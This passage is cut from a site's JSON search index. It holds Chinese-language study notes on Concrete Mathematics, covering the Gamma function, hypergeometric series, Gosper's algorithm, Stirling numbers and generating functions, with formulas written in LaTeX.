<p>\u539f\u6765\u6211\u4eec\u662f\u5bf9\u6574 \u6570r\u8bc1\u660e\u4e86\u8fd9\u4e9b\u6052\u7b49 \u5f0f\uff0c \u5e76\u7528\u591a\u9879\u5f0f\u63a8\u7406 \u6cd5\u6307\u51fa\u5b83\u4eec\u5728\u4e00\u822c \u60c5\u5f62\u4e5f\u6210\u7acb\uff0e \u73b0\u5728\u6211 \u4eec\u662f\u9996\u5148\u8bc1\u660e\u5b83\u4eec \u5bf9\u65e0\u7406\u6570r\u6210\u7acb\uff0c\u5e76 \u5229\u7528\u6781\u9650\u65b9\u6cd5\u6307\u51fa \u5b83 \u4eec \u5bf9 \u6574 \u6570 \u4e5f \u6210\u7acb</p> <ul> <li>\u4f7f\u7528\u9636\u4e58\u5c06\\({r+n-k \\choose n-k}\\)\u5c55\u5f00\u4e86\uff0c\u800c\u9636\u4e58\u539f\u672c\u5bf9\u8d1f\u6574\u6570\u65f6\u6ca1\u5b9a\u4e49\u3002</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u9636\u4e58\u63a8\u5e7f","title":"\u9636\u4e58\u63a8\u5e7f","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6b27\u62c9","title":"\u6b27\u62c9","text":"<p>\u6240\u6709\u590d\u6570z $$ \\frac{1}{z!} = \\lim_{n\\rightarrow \\infin} {n+z \\choose n}n^{-z} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#gamma\u51fd\u6570","title":"\\(\\Gamma\u51fd\u6570\\)","text":"\\[ z! = \\int_0^{\\infin}t^ze^{-t}dt, R_z&gt;-1 \\] <p>\u901a\u8fc7 $$ z! = z(z-1)! $$ \u5c06\u8be5\u5b9a\u4e49\u5ef6\u62d3\u5230\\(C - Z^-\\)\uff08\u9664\u4e86\u8d1f\u6574\u6570\u5916\u7684\u590d\u6570\uff09</p> <p>\u9636\u4e58\u548c\u4f3d\u9a6c\u51fd\u6570\u53ef\u4ee5\u76f8\u4e92\u66ff\u6362\u4f7f\u7528\u3002 $$ \\Gamma(z+1) = z!\\ (-z)!\\Gamma(z) = \\frac{\\pi}{\\sin{\\pi z}} $$ \u5e7f\u4e49\u9636\u4e58\u5e42 $$ z^{\\underline{w}} = \\frac{z!}{(z-w)!}\\ z^{\\bar{w}} = \\frac{\\Gamma(z+w)}{\\Gamma(z)}\\ $$ \u4e8c\u9879\u5f0f\u7cfb\u6570 $$ \\left(\\begin{array}{c} z \\ w \\end{array}\\right)=\\lim {\\zeta \\rightarrow z} \\lim {\\omega \\rightarrow w} \\frac{\\zeta !}{\\omega !(\\zeta-\\omega) !} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u725b\u987f\u7ea7\u6570_1","title":"\u725b\u987f\u7ea7\u6570","text":"\\[ \\ln(x!) = \\sum_k a_k x^k \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8303\u5fb7\u8499\u5377\u79ef_1","title":"\u8303\u5fb7\u8499\u5377\u79ef","text":"\\[ \\left(\\begin{array}{c} s \\\\ n \\end{array}\\right) F\\left(\\begin{array}{c} -r,-n \\\\ s-n+1 \\end{array}\\right)=\\left(\\begin{array}{c} r+s \\\\ n \\end{array}\\right) \\] <p>\u5f97 $$ \\begin{equation}     F\\left(\\begin{array}{c}     a, b \\     c     \\end{array} \\mid 1\\right)=\\frac{\\Gamma(c-a-b) \\Gamma(c)}{\\Gamma(c-a) \\Gamma(c-b)} ; \\text { \u6574\u6570 } b \\leqslant 0 \\text {, \u6216\u8005 } \\mathfrak{c} c&gt;\\Re a+\\Re b . \\end{equation} $$ \u7279\u6b8a\u60c5\u5f62 $$ \\begin{equation} F\\left(\\begin{array}{c} a,-n \\ c \\end{array} \\mid 1\\right)=\\frac{(c-a)^{\\bar{n}}}{c^{\\bar{n}}}=\\frac{(a-c)^{\\frac{n}{n}}}{(-c)^{n}}, \\quad \\text { \u6574\u6570 } n \\geqslant 0 \\end{equation} $$ \u56e0\u6b64\u57fa\u672c\u6240\u6709\u4e4b\u524d\u7684\u6c42\u548c\u516c\u5f0f\uff0c\u90fd\u53ef\u4ee5\u7528\u8fd9\u6761\u516c\u5f0f\u67e5\u8868\u7684\u65b9\u5f0f\u5f97\u5230\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6c42\u6781\u9650","title":"\u6c42\u6781\u9650","text":"<p>\u5df2\u77e5\u6709\uff08\u89c1p177\uff09 $$ (-1)^{n} \\frac{(2 n) !}{n !}=\\lim {b \\rightarrow-2 n} \\frac{(b / 2) !}{b !}=\\lim {x \\rightarrow-n} \\frac{x !}{(2 x) !} $$ \u56e0\u6b64\\(-6!/3!=\\lim_{x-&gt;-3}x!/(2x)!\\)</p> <ul> <li> <p>\u5982\u679c\u8ba4\u4e3a(-3) = (-3)(-4)(-5)(-6)!\uff0c\u7136\u540e\u6d88\u6389\u5c31\u4f1a\u5f97\u5230\u9519\u8bef\u7b54\u6848</p> </li> <li> <p>\u4f7f\u7528(5.87)\u5c06\u8d1f\u53d8\u91cf\u9636\u4e58\u548c\u6b63\u7684\u4f3d\u9a6c\u51fd\u6570\u8054\u7cfb\u8d77\u6765</p> </li> </ul> <p>\u6700\u540e\u4e00\u6b65\u4f7f\u7528\u6d1b\u5fc5\u8fbe   $$   \\lim_{r \\to 0}\\frac{(-n-r)!\\Gamma(n+r)}{(-2n - 2r)!\\Gamma(2n+2r)} = \\lim_{r \\to 0}\\frac{\\sin(2n+2r)\\pi}{\\sin(n+r)\\pi} = 2(-1)^n   $$   \u5f97   $$   \\lim_{x \\to -n} \\frac{x!}{(2x)!} = \\lim_{r \\to 0}\\frac{(-n-r)!}{(-2n - 2r)!} = 2(-1)^n \\frac{\\Gamma(2n)}{\\Gamma(n)} = (-1)^n\\frac{(2n)!}{n!}   $$</p> <p>\u4e0d\u540c\u6781\u9650</p> <p>\u7531(5.20)\\(\\sum_{k \\leqslant m}{m+k \\choose k} 2^{-k}=2^{m} \\to \\sum_{k\\ge 0}{2m-k \\choose m-k}2^k = 2^{2m}\\)</p> <p>\u5e94\u8be5\u8868\u793a\u4e3a $$ \\begin{equation} \\left(\\begin{array}{c} 2 m \\ m \\end{array}\\right) \\lim {\\varepsilon \\rightarrow \\infty} F\\left(\\begin{array}{c} 1,-m \\ -2 m+\\varepsilon \\end{array} \\mid 2\\right)=2^{2 m} \\end{equation} $$ \u4e0d\u540c\u6781\u9650\u662f\u4e0d\u540c\u7684 $$ \\begin{equation} \\begin{aligned} \\lim {\\varepsilon \\rightarrow 0} F\\left(\\begin{array}{c} -1+\\varepsilon,-3 \\ -2+\\varepsilon \\end{array} \\mid 1\\right)=\\lim {\\varepsilon \\rightarrow 0}\\left(1+\\frac{(-1+\\varepsilon)(-3)}{(-2+\\varepsilon) 1 !}+\\frac{(-1+\\varepsilon)(\\varepsilon)(-3)(-2)}{(-2+\\varepsilon)(-1+\\varepsilon) 2 !}\\right.\\ \\left.+\\frac{(-1+\\varepsilon)(\\varepsilon)(1+\\varepsilon)(-3)(-2)(-1)}{(-2+\\varepsilon)(-1+\\varepsilon)(\\varepsilon) 3 !}\\right) \\ =1-\\frac{3}{2}+0+\\frac{1}{2}=0 ; \\ \\lim {\\varepsilon \\rightarrow 0} F\\left(\\begin{array}{l} -1,-3 \\ -2+\\varepsilon \\end{array}\\right) =\\lim _{\\varepsilon \\rightarrow 0}\\left(1+\\frac{(-1)(-3)}{(-2+\\varepsilon) 1 !}+0+0\\right) \\ =1-\\frac{3}{2}+0+0=-\\frac{1}{2} . \\end{aligned} \\end{equation} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8d85\u51e0\u4f55\u53d8\u6362","title":"\u8d85\u51e0\u4f55\u53d8\u6362","text":"<p>\u5df2\u77e5\u7684\u8d85\u51e0\u4f55\u7ea7\u6570\u5c01\u95ed\u5f62\u5f0f\u662f\u8ba1\u7b97\u4e8c\u9879\u5f0f\u7cfb\u6570\u548c\u7684\u6709\u7528\u5de5\u5177\u3002</p> <p>\u800c\u8d85\u51e0\u4f55\u53d8\u6362\u7814\u7a76\u5982\u4f55\u5c06\u4e00\u4e2a\u8d85\u51e0\u4f55\u7ea7\u6570\u53d8\u6362\u6210\u53e6\u4e00\u4e2a\u7c7b\u4f3c\u4f46\u4e0d\u540c\u53c2\u6570\u7684\u8d85\u51e0\u4f55\u7ea7\u6570\u3002</p> <p>1797 \u5e74\uff0c J. F. \u666e\u6cd5\u592b [292] \u53d1\u73b0\u4e86\u4e00\u4e2a\u60ca\u4eba\u7684\u53cd\u5c04\u5b9a\u5f8b\uff08 reflection law \uff09  $$ \\frac{1}{(1-z)^{a}} F\\left(\\begin{array}{c|c} a, b &amp; -z \\ c &amp; 1-z \\end{array}\\right)=F\\left(\\left.\\begin{array}{c} a, c-b \\ c \\end{array}\\right| z\\right) $$</p> <p>\u5fae\u5206\u65b9\u5f0f\u5f97\u5230 $$ \\begin{equation}     \\begin{aligned}     &amp;\\frac{d}{d z} F\\left(\\begin{array}{l}     a_{1}, \\cdots, a_{m} \\     b_{1}, \\cdots, b_{n}     \\end{array} \\mid z\\right)=\\sum_{k \\geqslant 1} \\frac{a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k-1}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}}(k-1) !}\\     &amp;=\\sum_{k+1 \\geqslant 1} \\frac{a_{1}^{\\overline{k+1}} \\cdots a_{m}^{\\overline{k+1}} z^{k}}{b_{1}^{\\overline{k+1}} \\cdots b_{n}^{\\overline{k+1}} k !}\\     &amp;=\\sum_{k \\geqslant 0} \\frac{a_{1}\\left(a_{1}+1\\right)^{\\bar{k}} \\cdots a_{m}\\left(a_{m}+1\\right)^{\\bar{k}} z^{k}}{b_{1}\\left(b_{1}+1\\right)^{\\bar{k}} \\cdots b_{n}\\left(b_{n}+1\\right)^{\\bar{k}} k !}\\     &amp;=\\frac{a_{1} \\ldots a_{m}}{b_{1} \\ldots b_{n}} F\\left(\\begin{array}{ll}     a_{1}+1, \\ldots, &amp; a_{m}+1 \\     b_{1}+1, \\ldots, &amp; b_{n}+1     \\end{array} \\mid z\\right) \\text {. }     \\end{aligned} \\end{equation} $$</p> <p>\u53e6\u4e00\u4e2a\u7b97\u5b50 $$ \\vartheta = z\\frac{d}{d z} $$</p> \\[ \\begin{equation} \\begin{aligned} \\left(\\vartheta+a_{1}\\right) F\\left(\\begin{array}{c} a_{1}, \\cdots, a_{m} \\\\ b_{1}, \\cdots, b_{n} \\end{array} \\mid z\\right) &amp;=\\sum_{k \\geqslant 0} \\frac{\\left(k+a_{1}\\right) a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\\\ &amp;=\\sum_{k \\geqslant 0} \\frac{a_{1}\\left(a_{1}+1\\right)^{\\bar{k}} a_{2}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\\\ &amp;=a_{1} F\\left(\\left.\\begin{array}{c} a_{1}+1, a_{2}, \\cdots, a_{m} \\\\ b_{1}, \\cdots, b_{n} \\end{array}\\right| z \\right) \\end{aligned} \\end{equation} \\] \\[ \\begin{equation} \\begin{aligned} \\left(\\vartheta+b_{1}-1\\right) F\\left(\\begin{array}{c} a_{1}, \\cdots, a_{m} \\\\ b_{1}, \\cdots, b_{n} \\end{array} \\mid z\\right) &amp;=\\sum_{k \\geqslant 0} \\frac{\\left(k+b_{1}-1\\right) a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\\\ &amp;=\\sum_{k \\geqslant 0} \\frac{\\left(b_{1}-1\\right) a_{1}^{\\bar{k}} \\cdots a_{m}^{\\vec{k}} z^{k}}{\\left(b_{1}-1\\right)^{\\bar{k}} b_{2}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\\\ &amp;\\left.=\\left(b_{1}-1\\right) F\\left(\\begin{array}{c} a_{1}, \\cdots, a_{m} \\\\ b_{1}-1, b_{2}, \\cdots, b_{n} \\end{array}\\right| z\\right) \\end{aligned} \\end{equation} \\] <p>\u4e8e\u662f\u8d85\u51e0\u4f55\u51fd\u6570\u6ee1\u8db3\u5fae\u5206\u65b9\u7a0b\uff0c\u4e14\u662f\u4ec5\u6709\u7684\u6ee1\u8db3\u8be5\u5fae\u5206\u65b9\u7a0b\u5e38\u6570\u9879\u4e3a1\u7684\u5f62\u5f0f\u5e42\u7ea7\u6570 $$ \\begin{equation} \\mathrm{D}\\left(\\vartheta+b_{1}-1\\right) \\cdots\\left(\\vartheta+b_{n}-1\\right) F=\\left(\\vartheta+a_{1}\\right) \\cdots\\left(\\vartheta+a_{m}\\right) F, \\end{equation} $$</p> <p>F(a, b; c; z)\u6ee1\u8db3 $$ \\begin{equation} z(1-z) F^{\\prime \\prime}(z)+(c-z(a+b+1)) F^{\\prime}(z)-a b F(z)=0 \\end{equation} $$ \u5fae\u5206\u7406\u8bba\u7684\u4e00\u4e2a\u7528\u9014\u662f\u53d1\u73b0\u5e76\u8bc1\u660e\u65b0\u7684\u53d8\u6362\uff0c\u5982\u9ad8\u65af\u6052\u7b49\u5f0f\uff0c\u5747\u6ee1\u8db3\u76f8\u540c\u7684\u5fae\u5206\u65b9\u7a0b\u3002 $$ \\begin{equation}     \\left.\\left.F\\left(\\begin{array}{c}     2 a, 2 b \\     a+b+\\frac{1}{2}     \\end{array}\\right| z\\right)=F\\left(\\begin{array}{c}     a, b \\     a+b+\\frac{1}{2}     \\end{array}\\right| 4 z(1-z)\\right) \\end{equation} $$</p> <p>\u8d85\u51e0\u4f55\u7ea7\u6570\u5bf9\u4e8e\u7406\u89e3\u4e8c\u9879\u5f0f\u7cfb\u6570 \u548c\u5f0f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u6c34\u5e73\u7684\u65b9\u6cd5\uff0e\u66f4\u591a\u7684\u4fe1\u606f\u53ef\u4ee5\u5728 Bailey \u6240\u5199\u7684\u7ecf\u5178\u8457\u4f5c [18] \u4ee5\u53ca\u5176\u540e\u7531 Gasper \u548c Rahman \u5408\u8457\u7684\u4e66 [141] \u4e2d\u627e\u5230</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#gosper\u7b97\u6cd5\u6c42\u5dee\u5206\u539f\u51fd\u6570","title":"Gosper\u7b97\u6cd5(\u6c42\u5dee\u5206\u539f\u51fd\u6570)","text":"<p>1977\u5e74, R. W. Gosper \\({ }^{[154]}\\) \u53d1\u73b0\u4e86\u4e00\u4e2a\u4f18\u7f8e\u7684\u65b9\u6cd5, \u53ea\u8981 \\(f\\) \u548c \\(g\\) \u5c5e\u4e8e\u79f0\u4e3a\u8d85\u51e0\u4f55\u9879\u7684\u4e00\u822c \u51fd\u6570\u7c7b, \u5c31\u80fd\u7528\u6b64\u6cd5\u6c42\u51fa\u4e0d\u5b9a\u548c\u5f0f \\(\\sum f(k) \\delta k=g(k)+C\\). \u6211\u4eec\u8bb0 $$ F\\left(\\begin{array}{c} a_{1}, \\cdots, a_{m} \\ b_{1}, \\cdots, b_{n} \\end{array} \\mid z\\right){k}=\\frac{a{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}}} \\frac{z^{k}}{k !} $$ \u4e3a\u8d85\u51e0\u4f55\u7ea7\u6570 \\(F\\left(a_{1}, \\cdots, a_{m} ; b_{1}, \\cdots, b_{n} ; z\\right)\\) \u7684\u7b2c \\(k\\) \u9879. \u6211\u4eec\u5c06\u628a \\(\\left.F\\left(a_{1}, \\cdots, a_{m} ; b_{1}, \\cdots, b_{n} ; z\\right)\\right._{k}\\) \u770b\u6210\u662f \\(k\\) \u800c \u4e0d\u662f \\(z\\) \u7684\u4e00\u4e2a\u51fd\u6570. \u5728\u8bb8\u591a\u60c5\u5f62\u4e0b\u90fd\u8868\u660e, \u5bf9\u7ed9\u5b9a\u7684 \\(a_{1}, \\cdots, a_{m}, b_{1}, \\cdots, b_{n}\\) \u4ee5\u53ca \\(z\\), \u5b58\u5728\u53c2\u6570 \\(c\\), \\(A_{1}, \\cdots, A_{M}, B_{1}, \\cdots, B_{N}\\) \u4ee5\u53ca \\(Z\\), \u4f7f\u5f97 $$ \\sum F\\left(\\begin{array}{l} a_{1}, \\cdots, a_{m} \\ b_{1}, \\cdots, b_{n} \\end{array} \\mid z\\right){k} \\delta k=c F\\left(\\begin{array}{l} A{1}, \\cdots, A_{M} \\ B_{1}, \\cdots, B_{N} \\end{array} \\mid Z\\right)_{k}+C . $$ \u5b58\u5728\u79f0\u4e3a\u662f\u53ef\u7528\u8d85\u51e0\u4f55\u9879\u6c42\u548c\u7684(summable in hypergeometric terms )</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#gosper-zeilberger\u7b97\u6cd5","title":"Gosper-Zeilberger\u7b97\u6cd5","text":"<p>\\(t(n, k)\\). \u5f53 \\(t(n, k)\\) \u7ed9\u5b9a\u65f6, Gosper-Zeilberger\u7b97\u6cd5\u53ef\u4ee5\u603b\u7ed3\u5982\u4e0b: 0 \u7f6e \\(l:=0\\). ( \u6211\u4eec\u5c06\u5bfb\u6c42\u5173\u4e8e \\(n\\) \u7684 \\(l\\) \u9636\u9012\u5f52\u5f0f. ) 1 \u4ee4 \\(\\hat{t}(n, k)=\\beta_{0}(n) t(n, k)+\\cdots+\\beta_{l}(n) t(n+l, k)\\), \u5176\u4e2d \\(\\beta_{0}(n), \\cdots, \\beta_{l}(n)\\) \u662f\u672b\u77e5\u7684\u51fd\u6570. \u5229\u7528 \\(t(n, k)\\) \u7684\u6027\u8d28\u5bfb\u6c42 \\(\\beta_{0}(n), \\cdots, \\beta_{l}(n)\\) \u7684\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408 \\(p(n, k)\\), \u5176\u7cfb\u6570\u662f\u5173\u4e8e \\(n\\) \u548c \\(k\\) \u7684\u591a\u9879\u5f0f, \u4f7f \u5f97 \\(\\hat{t}(n, k)\\) \u53ef\u4ee5\u5199\u6210\u5f62\u5f0f \\(p(n, k) \\bar{t}(n, k)\\), \u5176\u4e2d \\(\\bar{t}(n, k)\\) \u662f\u5173\u4e8e \\(k\\) \u7684\u8d85\u51e0\u4f55\u9879. \u6c42\u591a\u9879\u5f0f \\(\\bar{p}(n, k)\\) \u3001 \\(q(n, k)\\) \u548c \\(r(n, k)\\), \u4f7f\u5f97 \\(\\bar{t}(n, k)\\) \u7684\u9879\u7684\u6bd4\u503c\u8868\u793a\u6210 \\((5.128)\\) \u7684\u5f62\u5f0f, \u5176\u4e2d \\(q(n, k)\\) \u548c \\(r(n, k)\\) \u6ee1\u8db3 Gosper\u6761\u4ef6 ( \\(5.118)\\). \u7f6e \\(\\hat{p}(n, k)=p(n, k) \\bar{p}(n, k)\\). 2a \u7f6e \\(d_{Q}:=\\operatorname{deg}(q-r), d_{R}:=\\operatorname{deg}(q+r)\\), \u4ee5\u53ca $$ d:= \\begin{cases}\\operatorname{deg}(\\hat{p})-d_{Q}, &amp; d_{Q} \\geqslant d_{R} \\ \\operatorname{deg}(\\hat{p})-d_{R}+1, &amp; d_{Q}&lt;d_{R}\\end{cases} $$ \\(2 \\mathrm{~b}\\) \u5982\u679c \\(d \\geqslant 0\\), \u7528 \\((5.130)\\) \u5b9a\u4e49 \\(s(n, k)\\), \u5e76\u8003\u8651\u5173\u4e8e \\(\\alpha_{0}, \\cdots, \\alpha_{d}, \\beta_{0}, \\cdots, \\beta_{l}\\) \u7684\u8bf8\u4e2a\u7ebf\u6027\u65b9 \u7a0b, \u8fd9\u4e9b\u65b9\u7a0b\u662f\u5728\u57fa\u672c\u65b9\u7a0b ( 5.129) \u4e2d\u4ee4 \\(k\\) \u7684\u5e42\u7684\u7cfb\u6570\u76f8\u7b49\u800c\u5f97\u5230\u7684. \u5982\u679c\u8fd9\u4e9b\u65b9\u7a0b\u6709\u4e00\u4e2a \u4f7f\u5f97 \\(\\beta_{0}, \\cdots, \\beta_{l}\\) \u4e0d\u5168\u4e3a\u96f6\u7684\u89e3, \u5c31\u8f6c\u5230\u7b2c4\u6b65. \u5982\u82e5\u4e0d\u7136, \u5f53 \\(d_{Q}&lt;d_{R}\\) \u4e14 \\(-2 \\lambda^{\\prime} / \\lambda\\) \u662f\u4e00\u4e2a\u5927\u4e8e \\(d\\) \u7684 \u6574\u6570\u65f6 (\u5176\u4e2d \\(\\lambda\\) \u662f \\(q+r\\) \u4e2d \\(k^{d_{R}}\\) \u7684\u7cfb\u6570, \u800c \\(\\lambda^{\\prime}\\) \u5219\u662f \\(q-r\\) \u4e2d \\(k^{d_{R}-1}\\) \u7684\u7cfb\u6570 ), \u5c31\u7f6e \\(d:=-2 \\lambda^{\\prime} / \\lambda\\) \u5e76 \u91cd\u590d\u7b2c \\(2 \\mathrm{~b}\\) \u6b65. 3 ( \u9879 \\(\\hat{t}(n, k)\\) \u4e0d\u662f\u8d85\u51e0\u4f55\u53ef\u6c42\u548c\u7684. ) \u5c06 \\(l\\) \u589e\u52a0 1 \u5e76\u56de\u5230\u7b2c 1 \u6b65. 4 \uff08\u6210\u529f. ) \u7f6e \\(T(n, k):=r(n, k) s(n, k) \\bar{t}(n, k) / \\bar{p}(n, k)\\). \u7531\u8be5\u7b97\u6cd5, \u5c31\u5f97\u5230\u4e86 \\(\\hat{t}(n, k)=T(n\\), \\(k+1)-T(n, k) .\\) \u4ee5\u540e\u6211\u4eec\u5c06\u8981\u8bc1\u660e, \u53ea\u8981 \\(t(n, k)\\) \u5c5e\u4e8e\u79f0\u4e3a\u6b63\u5e38\u9879\uff08proper term \uff09\u7684\u4e00\u4e2a\u5927\u7c7b, \u8fd9\u4e2a\u7b97\u6cd5 \u5c31\u80fd\u6210\u529f\u5730\u7ec8\u6b62.</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#6-\u7279\u6b8a\u7684\u6570","title":"6 \u7279\u6b8a\u7684\u6570","text":"<ul> <li> <p>\u7b2c\u4e8c\u7c7b\u65af\u7279\u6797\u6570\uff08n\u771f\u5b50\u96c6k\uff09</p> \\[ {n \\brace k} = {n - 1 \\brace k-1} + k{n-1 \\brace k} \\] <p>\u5206\u522b\u8ba8\u8bba\u7b2c\u4e00\u4e2a\u6570\uff1a1\uff09\u5355\u72ec\u6210\u4e3a\u4e00\u4e2a\u5b50\u96c6\u30022\uff09\u4ece\\({n-1 \\brace k}\\)\u4e2d\u9009\u62e9\u4e00\u4e2a\uff0c\u6709k\u79cd\u53ef\u80fd</p> <ul> <li>\u7279\u503c</li> </ul> <p>\\({n \\brace 2} = 2^{n-1}-1\\)</p> </li> <li> <p>\u7b2c\u4e00\u7c7bstirling\u6570\uff08n\u8f6e\u6362k\uff09\uff08\u5728n\u5b50\u96c6k\u7684\u6bcf\u4e2a\u5b50\u96c6\u4e0a\uff0c\u4e58\u4e0a\u8f6e\u6362\u7684\u79cd\u7c7b\uff09</p> \\[ {n \\brack k} = {n - 1 \\brack k-1} + (n-1){n-1 \\brack k} \\] <p>\u5206\u522b\u8ba8\u8bba\u7b2c\u4e00\u4e2a\u6570\uff1a1\uff09\u5355\u72ec\u6210\u4e3a\u4e00\u4e2a\u5b50\u96c6\u30022\uff09\u4ece\\({n-1 \\brack k}\\)\u4e2d\u9009\u62e9\u4e00\u4e2a\uff0c\\(t_1 +t_2+...+t_k = n-1\\)\uff0c\u52a0\u5165\\(t_i\\)\u4e2a\u5143\u7d20\u7684\u8f6e\u6362\u65f6\uff0c\u79cd\u6570\u4e3a\\(t_i{n-1 \\brack k}\\)</p> <ul> <li>\u7279\u6b8a\u503c</li> </ul> <p>\\({n \\brack 1} = (n-1)![n&gt;0]\\)</p> <p>\\({n \\brack 2} = (n-1)!H_{n-1}[n&gt;0]\\)</p> </li> <li> <p>\u7b2c\u4e00\u7c7bstirling\u6570\u548c\u6392\u5217\u5173\u7cfb</p> </li> <li> <p>\u4e00\u4e2a\u6392\u5217\u5bf9\u5e94\u4e00\u4e2a\u8f6e\u6362</p> <ul> <li>\u6392\u5217\\(\\pi_1\\pi_2...\\pi_n\\)\uff0c\u8868\u793a\u5c06\\(i \\to \\pi_i\\)\u3002\u4ece\u4efb\u4e00\u4e2a\u5143\u7d20\u51fa\u53d1\uff0c\u6620\u5c04\u53ef\u4ee5\u6784\u6210\u4e00\u4e2a\u73af\u3002\\(m_0 = m, m_k = \\pi_{m_{k-1}}\\)</li> </ul> </li> <li> <p>\u4e00\u4e2a\u8f6e\u6362\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6392\u5217\uff0c\u56e0\u6b64     $$     \\sum_k {n \\brack k} = n!     $$</p> </li> <li> <p>stirling\u6570\u4e0e\u4e0b\u964d\u5e42   $$   x^n = \\sum_k {n \\brace k}x^{\\underline{k}}, n\\ge 0   $$</p> </li> <li> <p>\u7b2c\u4e8c\u7c7bstirling\u6570\u4e0e\u4e0a\u5347\u5e42   $$   x^{\\bar{n}} = \\sum_k {n \\brack k}x^k, n\\ge 0   $$</p> </li> <li> <p>\u5bf9\u5076\u6027</p> </li> </ul> <p>\u5c06stirling\u6570\u5bf9n,k\u4e0d\u505a\u4efb\u4f55\u9650\u5236\u540e(\u52a0\u4e0a\u6761\u4ef6\\({0 \\brace k} = [k=0], {n\\brace 0} = [n=0]\\))\u53ef\u5f97   $$   {n \\brack k} = {-k \\brace -n}   $$</p> <ul> <li></li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6b27\u62c9\u6570","title":"\u6b27\u62c9\u6570","text":"<ul> <li>\\({n }\\)</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#7-\u751f\u6210\u51fd\u6570","title":"7 \u751f\u6210\u51fd\u6570","text":"<p>\u4ece\u4e4b\u540e\u6765\u770b\uff0c\u751f\u6210\u51fd\u6570\u5c31\u662f\u4e00\u4e2a\u548c\u5f0f\uff0c\u5305\u542b\u5173\u4e8e\u7814\u7a76\u95ee\u9898\u7684\u5168\u90e8\u4fe1\u606f\uff08\u8d34\u74f7\u7816\uff0c\u6982\u7387\u5206\u5e03\u3002\u3002\u3002\uff09</p> <ul> <li>\u591a\u7c73\u8bfa\u94fa\u8bbe\uff0c\u751f\u6210\u51fd\u6570\u8bbe\u7f6e\u4e3a\u6240\u6709\u94fa\u8bbe</li> <li>\u5ffd\u7565\u94fa\u8bbe\u65b9\u5f0f\uff08\u6253\u6563\u6210\u96f6\u4ef6\uff09\uff0c\u53ea\u8003\u8651\u4f7f\u7528\u7684\u884c\u5217\u591a\u7c73\u8bfa\u6570\u91cf</li> <li>\u53ea\u8003\u8651\u591a\u7c73\u8bfa\u9aa8\u724c\u7684\u6570\u91cf\uff1a\u6bcf\u4e00\u9879\u7cfb\u6570\u4e3a3xn(\u62162xn)\u94fa\u8bbe\u5728\u6307\u5b9a\u6570\u91cf\u9aa8\u724c\u65f6\u7684\u65b9\u5f0f\u603b\u6570\u3002</li> <li>\u627e\u786c\u5e01</li> <li>\\([z^n]\\frac{1}{1-z}\\frac{1}{1-z^5}...\\frac{1}{1-z^{50}}\\)</li> <li>\u4e66\u4e0a\u901a\u8fc7\u8f6c\u6362\u6210\u9012\u5f52\u5f0f\u6c42\u89e3</li> <li>7.2\u751f\u6210\u51fd\u6570\u53d8\u6362</li> <li>\\(F(z) = \\sum_n f_nz^n\\)\uff0c\u5ef6\u62d3\u5230\\(n \\in Z, n&lt;0 \\to f_n=0\\)</li> <li>\u751f\u6210\u51fd\u6570\u53d8\u6362<ul> <li>\\(&lt;\\alpha f_n+\\beta g_n&gt; \\to \\alpha F(z) + \\beta G(z)\\)</li> <li>\\(&lt;0, 0,...,0_m, g_0, g_1,..&gt;\\)  